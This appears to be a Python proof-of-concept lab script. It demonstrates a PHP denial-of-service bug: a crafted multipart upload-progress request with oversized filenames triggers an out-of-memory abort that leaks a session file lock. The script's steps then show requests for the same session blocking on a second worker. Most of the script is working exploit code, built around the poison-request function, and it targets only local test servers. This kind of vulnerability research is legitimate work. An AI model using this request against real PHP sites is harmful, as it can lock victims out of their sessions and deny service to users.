#!/usr/bin/env python3
"""
xdos.py — two-worker local lab proving upload_progress OOM session-lock leak.

Worker A (127.0.0.1:8110) is poisoned with the upload_progress OOM request for
SID "vic".  We assert a leaked fd on sess_vic persists in worker A, check
/proc/locks for its WRITE lock, then prove worker B (127.0.0.1:8111) blocks on
the same SID while an innocent SID answers near-instantly.

Stdlib only.
"""
import http.client
import os
import signal
import subprocess
import sys
import time

BASE = "/home/wh1t3r0se/ph2s_xdos"
PHP = os.path.expanduser("~/php2shell-lab/release/sapi/cli/php")
SESS = os.path.join(BASE, "sess")
VIC_FILE = os.path.join(SESS, "sess_vic")
VIC_SID = "vic"
INNOCENT_SID = "innocent01"
PORT_A = 8110
PORT_B = 8111
N_FILE_PARTS = 20
FILENAME_LEN = 262144


def out(msg):
    print(msg, flush=True)


def verdict(name, val):
    out(f"VERDICT {name}={'True' if val else 'False'}")


def start_worker(ini, docroot, port, logpath):
    env = dict(os.environ)
    env["PHP_CLI_SERVER_WORKERS"] = "4"
    lf = open(logpath, "ab")
    p = subprocess.Popen(
        [PHP, "-n", "-c", ini, "-S", f"127.0.0.1:{port}", "-t", docroot],
        stdin=subprocess.DEVNULL, stdout=lf, stderr=subprocess.STDOUT,
        env=env, cwd=BASE, start_new_session=True,
    )
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        if p.poll() is not None:
            raise RuntimeError(f"worker on {port} exited early rc={p.returncode}")
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
            c.request("GET", "/__ping__")
            c.getresponse().read()
            c.close()
            out(f"[boot] worker port={port} pid={p.pid} ready")
            return p
        except OSError:
            time.sleep(0.2)
    raise RuntimeError(f"worker on {port} never became ready")


def descendants(root_pid):
    """All descendant pids of root_pid via /proc children files."""
    result, frontier, seen = [], [root_pid], set()
    while frontier:
        pid = frontier.pop()
        if pid in seen:
            continue
        seen.add(pid)
        try:
            with open(f"/proc/{pid}/task/{pid}/children") as f:
                kids = [int(x) for x in f.read().split()]
        except (FileNotFoundError, ProcessLookupError, PermissionError, ValueError):
            kids = []
        for k in kids:
            if k not in seen:
                result.append(k)
                frontier.append(k)
    return result


def build_poison_body():
    boundary = "xdoS-boundary-0123456789abcdef"
    chunks = []

    def field(name, value):
        chunks.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode()
        )

    field("PHPSESSID", VIC_SID)
    field("PHP_SESSION_UPLOAD_PROGRESS", "poc")
    fname = "A" * FILENAME_LEN
    for i in range(N_FILE_PARTS):
        chunks.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"f{i}\"; filename=\"{fname}\"\r\n"
            f"Content-Type: application/octet-stream\r\n\r\nx\r\n".encode()
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), boundary


def poison_worker_a():
    body, boundary = build_poison_body()
    out(f"[poison] body_bytes={len(body)} file_parts={N_FILE_PARTS} "
        f"filename_len={FILENAME_LEN}")
    t0 = time.monotonic()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", PORT_A, timeout=120)
        conn.request(
            "POST", "/", body=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={VIC_SID}",
            })
        resp = conn.getresponse()
        data = resp.read()
        out(f"[poison] answered status={resp.status} bytes={len(data)} "
            f"in {time.monotonic()-t0:.2f}s (unexpected but continuing)")
        conn.close()
    except Exception as e:
        out(f"[poison] request aborted after {time.monotonic()-t0:.2f}s "
            f"({type(e).__name__}: {e}) -- expected OOM request abort")


def find_open_session_fds(pids, basename="sess_vic"):
    """Return (hits, key) where hits = [(pid, fd, target, dev, ino)]."""
    try:
        st = os.stat(os.path.join(SESS, basename))
        key = (st.st_dev, st.st_ino)
    except FileNotFoundError:
        key = None
    hits = []
    for pid in pids:
        fd_dir = f"/proc/{pid}/fd"
        try:
            fds = os.listdir(fd_dir)
        except OSError:
            continue
        for fd in fds:
            p = f"{fd_dir}/{fd}"
            try:
                s = os.stat(p)  # follows the fd symlink to the open file
            except OSError:
                continue
            try:
                tgt = os.readlink(p)
            except OSError:
                tgt = "?"
            if key is not None:
                match = (s.st_dev, s.st_ino) == key
            else:
                match = basename in tgt
                if match:
                    key = (s.st_dev, s.st_ino)
            if match:
                hits.append((pid, fd, tgt, s.st_dev, s.st_ino))
    return hits, key


def locks_for_inode(ino):
    rows = []
    with open("/proc/locks") as f:
        for line in f:
            parts = line.split()
            if len(parts) < 6:
                continue
            devino = parts[5].split(":")
            if len(devino) == 3:
                try:
                    lino = int(devino[2])
                except ValueError:
                    continue
                if lino == ino:
                    rows.append({
                        "raw": line.strip(),
                        "class": parts[1],
                        "type": parts[3],
                        "pid": int(parts[4]) if parts[4].lstrip("-").isdigit() else None,
                    })
    return rows


def timed_sid_request(port, sid, timeout):
    t0 = time.monotonic()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
        conn.request("POST", "/", body=b"",
                     headers={"Cookie": f"PHPSESSID={sid}"})
        resp = conn.getresponse()
        data = resp.read()
        dt = time.monotonic() - t0
        conn.close()
        return {"outcome": "answered", "dt": dt, "status": resp.status,
                "body": data[:64]}
    except Exception as e:
        return {"outcome": f"aborted:{type(e).__name__}",
                "dt": time.monotonic() - t0, "status": None,
                "body": str(e)[:120]}


def main():
    out(f"[lab] base={BASE} php={PHP}")
    v = subprocess.run([PHP, "-v"], capture_output=True, text=True)
    out(f"[lab] php: {v.stdout.splitlines()[0]}")

    # clean any stale workers from earlier runs
    subprocess.run(["bash", "-lc",
                    "pkill -9 -f 'sapi/cli/php -n -c' 2>/dev/null; true"],
                   capture_output=True)
    for f in os.listdir(SESS):
        os.unlink(os.path.join(SESS, f))
    out("[lab] stale workers killed, sess/ cleaned")

    pA = start_worker(f"{BASE}/labA.ini", f"{BASE}/wA", PORT_A,
                      f"{BASE}/workerA.server.log")
    pB = start_worker(f"{BASE}/labB.ini", f"{BASE}/wB", PORT_B,
                      f"{BASE}/workerB.server.log")
    out(f"[boot] worker A master={pA.pid} children={descendants(pA.pid)}")
    out(f"[boot] worker B master={pB.pid} children={descendants(pB.pid)}")

    try:
        # ---- Step 1: poison worker A with SID vic ----
        poison_worker_a()

        # wait for the leaked fd to become visible
        hits, key = [], None
        deadline = time.monotonic() + 15
        while time.monotonic() < deadline:
            if not os.path.exists(VIC_FILE):
                time.sleep(0.2)
                continue
            a_pids = [pA.pid] + descendants(pA.pid)
            hits, key = find_open_session_fds(a_pids, "sess_vic")
            if hits:
                break
            time.sleep(0.3)

        out(f"[leak] sess_vic exists={os.path.exists(VIC_FILE)}")
        if key:
            out(f"[leak] sess_vic dev={key[0]} ino={key[1]}")
        for h in hits:
            out(f"[leak] OPEN_FD pid={h[0]} fd={h[1]} target={h[2]} ino={h[4]}")
        a_leaked = len(hits) > 0
        verdict("A_LEAKED_FD", a_leaked)

        # ---- Step 2: /proc/locks check for WRITE lock by worker A ----
        write_lock_by_a = False
        lock_rows = []
        if key:
            lock_rows = locks_for_inode(key[1])
        a_pids = {pA.pid} | set(descendants(pA.pid))
        for r in lock_rows:
            out(f"[locks] {r['raw']}")
            if r["type"] == "WRITE" and r["pid"] in a_pids:
                write_lock_by_a = True
        out(f"[locks] A_WRITE_LOCK_IN_PROC_LOCKS={write_lock_by_a}")

        # ---- Step 3: same SID vic against worker B (expect block) ----
        t_same = timed_sid_request(PORT_B, VIC_SID, timeout=12)
        out(f"[B/vic] outcome={t_same['outcome']} dt={t_same['dt']:.2f}s "
            f"status={t_same['status']} body={t_same['body']}")
        b_blocked = (t_same["outcome"] != "answered") or (t_same["dt"] > 10)
        verdict("B_SAMESID_BLOCKED", b_blocked)

        # ---- Step 4: innocent SID against worker B (expect instant) ----
        t_inn = timed_sid_request(PORT_B, INNOCENT_SID, timeout=5)
        out(f"[B/innocent] outcome={t_inn['outcome']} dt={t_inn['dt']:.2f}s "
            f"status={t_inn['status']} body={t_inn['body']}")
        b_innocent = (t_inn["outcome"] == "answered" and t_inn["dt"] < 5
                      and t_inn["status"] == 200)
        verdict("B_INNOCENT_NEARINSTANT", b_innocent)

        overall = a_leaked and write_lock_by_a and b_blocked and b_innocent
        out(f"OVERALL_DEMONSTRATED={overall}")
        return 0 if overall else 1
    finally:
        for p in (pA, pB):
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            except ProcessLookupError:
                pass
        time.sleep(1)
        for p in (pA, pB):
            try:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
            except ProcessLookupError:
                pass
        subprocess.run(["bash", "-lc",
                        "pkill -9 -f 'sapi/cli/php -n -c' 2>/dev/null; true"],
                       capture_output=True)
        out("[teardown] both workers killed")


if __name__ == "__main__":
    sys.exit(main())
